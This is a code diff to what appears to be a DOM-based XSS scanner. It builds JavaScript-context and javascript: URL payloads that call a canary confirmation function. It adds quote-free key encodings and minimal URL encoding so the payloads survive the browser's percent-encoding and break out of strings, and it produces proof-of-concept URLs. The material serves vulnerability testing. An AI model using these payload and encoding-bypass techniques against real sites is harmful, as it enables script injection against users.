@@ -343,11 +343,28 @@ JS_SINKS = {'eval', 'func', 'setTimeout', 'setInterval', 'script_text'}
 URL_SINKS = {'location_assign', 'location_replace', 'location_href', 'location_nav', 'a_href', 'form_action', 'iframe_src', 'script_src', 'window_open'}
 HTML_SINKS = {'html'}
 
+def js_key_arg(key):
+    """A quote-free JS expression evaluating to `key`. Chromium's URL parser
+    percent-encodes ' " ` (and < > space) in query and fragment, so a payload
+    carrying any quote arrives at raw location.search/hash readers
+    percent-encoded and turns into a syntax error — while a regex literal's
+    `.source` survives the URL raw and evaluates to exactly `key`. Keys with
+    regex-syntax chars ([ ] / %) fall back to String.fromCharCode."""
+    if re.fullmatch(r'[A-Za-z0-9_.\-]+', key):
+        return f'/{key}/.source'
+    return 'String.fromCharCode(' + ','.join(str(ord(c)) for c in key) + ')'
+
+
 JS_PAYLOADS = {
-    'expr':     "rsjsstorage.alertfunc('{key}');",
-    'single':   "'-rsjsstorage.alertfunc(\"{key}\")-'",
-    'double':   "\"-rsjsstorage.alertfunc('{key}')-\"",
-    'backtick': "`-rsjsstorage.alertfunc('{key}')-`",
+    # {arg} = js_key_arg(key): quote-free, so payloads still execute when the
+    # page receives them raw (undecoded) from location.search/hash. String-
+    # literal contexts (single/double/backtick) cannot break out without a
+    # quote char, so those stay unconfirmable for raw readers — by design,
+    # since a real attacker faces the same URL encoding.
+    'expr':     "rsjsstorage.alertfunc({arg});",
+    'single':   "'-rsjsstorage.alertfunc({arg})-'",
+    'double':   "\"-rsjsstorage.alertfunc({arg})-\"",
+    'backtick': "`-rsjsstorage.alertfunc({arg})-`",
 }
 
 
@@ -467,12 +484,12 @@ def get_payloads(sink, canary):
     for key in sink.get('sources', []):
         if stype in JS_SINKS:
             ctx = detect_js_context(code, canary, key)
-            payload = JS_PAYLOADS[ctx].format(key=key)
+            payload = JS_PAYLOADS[ctx].format(arg=js_key_arg(key))
             results.append({'key': key, 'sink': stype, 'ctx': ctx, 'payload': payload})
 
         elif stype in URL_SINKS:
             results.append({'key': key, 'sink': stype, 'ctx': 'url',
-                            'payload': f"javascript:rsjsstorage.alertfunc('{key}')"})
+                            'payload': f"javascript:rsjsstorage.alertfunc({js_key_arg(key)})"})
 
         elif stype in HTML_SINKS:
             # createElement single-tag shape: code is exactly `<canary+key>`,
@@ -503,10 +520,10 @@ def get_payloads(sink, canary):
             attr = parts[2] if len(parts) > 2 else ''
             if attr.startswith('on'):
                 results.append({'key': key, 'sink': stype, 'ctx': 'event',
-                                'payload': f"rsjsstorage.alertfunc('{key}')"})
+                                'payload': f"rsjsstorage.alertfunc({js_key_arg(key)})"})
             elif attr in ('href', 'src', 'action', 'formaction'):
                 results.append({'key': key, 'sink': stype, 'ctx': 'url',
-                                'payload': f"javascript:rsjsstorage.alertfunc('{key}')"})
+                                'payload': f"javascript:rsjsstorage.alertfunc({js_key_arg(key)})"})
 
     return results
 
@@ -528,16 +545,44 @@ def build_inject_js(payloads):
     return js
 
 
+def minimal_query_encode(v):
+    """Percent-encode only what breaks a URL query value: % & # + and space.
+    Everything else (quotes, <>, parens, slashes) stays raw so pages that
+    read location.search RAW — regex extraction, no URLSearchParams, no
+    decodeURIComponent — receive the payload's quote characters unencoded
+    and string breakouts still work. Browsers accept those characters raw
+    in the query component. (A raw space can never survive anyway: the
+    browser itself re-encodes it to %20.)"""
+    return (v.replace('%', '%25').replace('&', '%26').replace('#', '%23')
+             .replace('+', '%2B').replace(' ', '%20'))
+
+
 def build_payload_url(base_url, key, payload):
     """Build a PoC URL with `payload` substituted as the value of `key`.
-    For key == '_hash', strips any existing fragment and appends `#<payload>` raw."""
+    For key == '_hash', strips any existing fragment and appends `#<payload>` raw.
+    The value is minimally encoded (see minimal_query_encode) so raw
+    location.search readers get the quotes intact; other params keep their
+    raw values (a parse_qs+urlencode rebuild would re-encode them too)."""
     if key == '_hash':
         return base_url.split('#', 1)[0] + '#' + payload
+    payload_enc = minimal_query_encode(payload)
     parsed = urlparse(base_url)
-    params = parse_qs(parsed.query, keep_blank_values=True)
-    params[key] = [payload]
-    new_query = urlencode(params, doseq=True)
-    return urlunparse(parsed._replace(query=new_query))
+    parts = parsed.query.split('&') if parsed.query else []
+    out = []
+    replaced = False
+    for p in parts:
+        if '=' in p:
+            k, _ = p.split('=', 1)
+        else:
+            k = p
+        if k == key:
+            out.append(key + '=' + payload_enc)
+            replaced = True
+        else:
+            out.append(p)
+    if not replaced:
+        out.append(key + '=' + payload_enc)
+    return urlunparse(parsed._replace(query='&'.join(out)))
 
 
 def emit_confirmed(base_url, confirmed):
